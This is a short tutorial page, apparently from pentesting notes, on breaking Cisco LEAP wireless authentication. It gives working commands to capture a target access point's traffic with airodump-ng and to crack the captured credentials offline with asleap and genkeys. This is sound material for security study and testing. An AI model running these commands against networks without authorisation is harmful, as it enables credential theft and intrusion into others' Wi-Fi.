---
title: LEAP
---

## What is this about?
Lightweight Extensible Authentication Protocol, which is Cisco's DIY version of MS-CHAP. 

## Step 0
Read [this](https://en.wikipedia.org/wiki/Lightweight_Extensible_Authentication_Protocol) and [that](https://freeradius.org/rfc/leap.txt)

## Lets oneshot this

### Dumping traffic
Last time I checked LEAP was as used as much as WEP, so yeah this is going to be a short one!

Get your target's info with a simple
```
airodump-ng mon0
```
Get the channel and BSSID and set it in the following command to whatever your target is
```
airodump-ng -c 2 --bssid 00:11:22:33:44:55 -w /tmp/potato.cap mon0
```
You can run this directly on asleap with the -i option though, this is just an extra step to have logs and target a single AP...

### Breaking LEAP

Get AsleaP by running a
```
git clone https://github.com/joswr1ght/asleap
```
Generate your hashes + indexes with genkeys if you need to.
```
./genkeys -r your-dictionary -f /path/to/hashes -n /path/to/indexes
```
Now run the following line every so often 
```
./asleap -r /tmp/potato.cap -f /path/to/hashes -n /path/to/indexes -v
```
Go watch some TV and come back for the next run...